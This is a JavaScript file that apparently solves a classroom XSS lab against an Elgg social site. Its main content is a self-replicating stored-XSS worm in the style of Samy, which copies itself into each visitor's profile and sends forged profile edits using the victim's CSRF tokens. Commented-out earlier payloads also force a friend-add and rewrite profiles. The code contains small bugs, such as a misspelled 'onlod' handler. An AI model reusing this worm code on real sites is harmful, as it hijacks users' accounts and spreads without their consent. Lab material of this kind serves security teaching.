<script type="text/javascript" id="worm">

	window.onlod = function(){
		
		var userName = elgg.session.user.name;
		var guid = "&guid="+elgg.session.user.guid;
		var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token = "&__elgg_token="+elgg.security.token.__elgg_token;
		var briefdesc = "&briefdescription=Chandan+is+my+Hero".concat("&accesslevel%5Bbriefdescription%5D=2");
		var name = "&name="+userName;
		
		var jsCode = "<script type='text/javascript' id='worm'>".concat(document.getElementById("worm").innerHTML).concat("</").concat("script>");
		var wormCode = encodeURIComponent(jsCode);
		var desc = "&description=".concat(wormCode).concat(+"&accesslevel%5Bbriefdescription%5D=2");
		
		var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
		var content = token+ts+name+desc+briefdesc+guid;
		samyGuid = 47;
		
		if(elgg.session.user.guid != samyGuid){
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}

</script>

/*
<script type="text/javascript">
    window.onload = function(){
        var userName = elgg.session.user.name;
        var guid = "&guid="+elgg.session.user.guid;
        var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token = "&__elgg_token="+elgg.security.token.__elgg_token;
        var desc = "&description=Chandan+is+my+Hero"+"&accesslevel%5Bdescripton%5D=2";
        var name = "&name="+userName;

        var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
        var content = token+ts+name+desc+guid;
        var samyGuid = 47;

        if(elgg.session.user.guid != samyGuid){
                var Ajax = null;
                Ajax = new XMLHttpRequest();
                Ajax.open("POST",sendurl,true);
                Ajax.setRequestHeader("Host","www.xsslabelgg.com");
                Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
                Ajax.send(content);
        }
    }
</script>
*/



//alert("Chandan XSS from script.js");

/*
window.onload = function(){
	var Ajax = null;
        var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token = "&__elgg_token="+elgg.security.token.__elgg_token;
        var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47"+token+ts;
        Ajax = new XMLHttpRequest();
        Ajax.open("GET",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslagelgg.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send();
}*/